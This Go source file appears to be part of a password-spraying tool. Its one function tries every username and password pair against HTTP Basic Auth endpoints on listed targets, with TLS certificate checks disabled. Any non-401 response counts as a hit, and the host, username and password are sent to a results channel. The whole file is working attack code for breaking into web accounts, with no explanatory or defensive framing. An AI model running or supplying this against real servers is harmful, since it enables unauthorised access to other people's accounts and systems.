package main

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"sync"
)



func basicSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task, storeResult *int, debugRun bool) {
	defer wg.Done()
	internalCounter := 0
	for _,taskTarget := range taskToRun.targetsRaw {
		temporaryTarget := parseTarget(taskTarget)
		taskToRun.target = temporaryTarget
		if taskToRun.target.port == 0 {
			taskToRun.target.port = 80
		}

		for _,password := range taskToRun.passwords {
			for _,username := range taskToRun.usernames {
				if internalCounter >= *storeResult {
					headerValue := base64.StdEncoding.EncodeToString([]byte(username+":"+password))
					http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
					client := &http.Client{}
					req, _ := http.NewRequest("GET", taskToRun.target.scheme+"://"+taskToRun.target.host+":"+strconv.Itoa(taskToRun.target.port)+"/"+taskToRun.target.url, nil)
					req.Header.Set("Authorization", "Basic "+headerValue)
					res, _ := client.Do(req)
					if res.StatusCode == 401 {
						fmt.Print("-")
					} else {
						if(debugRun == true) {
							bodyBytes, err := io.ReadAll(res.Body)
							if err != nil {
								fmt.Print("Error: no response body")
							}
							bodyString := string(bodyBytes)
							fmt.Println("DEBUG:",res.StatusCode,bodyString)
							for name, values := range res.Header {
								for _, value := range values {
									fmt.Println(name, value)
								}
							}
						}
						fmt.Print("+")
						channelToCommunicate <- taskToRun.target.host + ":" + username+":"+password
					}
					*storeResult++
				} else {
				}
				internalCounter++
			}
		}
	}
}